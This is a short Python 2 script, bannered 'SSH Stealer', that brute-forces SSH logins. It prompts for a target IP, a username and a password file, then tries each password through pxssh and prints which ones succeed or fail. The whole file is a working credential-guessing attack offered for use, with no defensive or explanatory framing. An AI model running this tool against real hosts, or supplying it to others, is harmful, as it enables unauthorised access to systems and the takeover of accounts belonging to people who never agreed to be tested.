#!/usr/bin/python
import sys
from pexpect import pxssh

from colorama import init
init(strip=not sys.stdout.isatty()) # strip colors if stdout is redirected
from termcolor import cprint 
from pyfiglet import figlet_format

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


cprint(figlet_format('          SSH Stealer', font='doom'),
       'blue', attrs=['bold'])

try:

    print("            This program makes brute force to SSH connection.")
    print("")
   
    ip = raw_input("Enter the target's IP:")
    username = raw_input("Enter the username:")
    pasf = raw_input("Enter the password file location:")
    pasf = open(pasf, "r")

    for pasw in pasf:
           try:
               s = pxssh.pxssh()
               s.login (ip, username, pasw)
               print bcolors.OKGREEN + ("[+]Password Found! "),pasw + bcolors.ENDC    
               s.logout()
               s.logout() #this is for make program error and shutdown
                    
           except pxssh.ExceptionPxssh, e:
               print bcolors.WARNING + ("[-]Password Denied! "),pasw + bcolors.ENDC
               

except (KeyboardInterrupt, SystemExit):
    raise
    print ("Bye")
    exit()
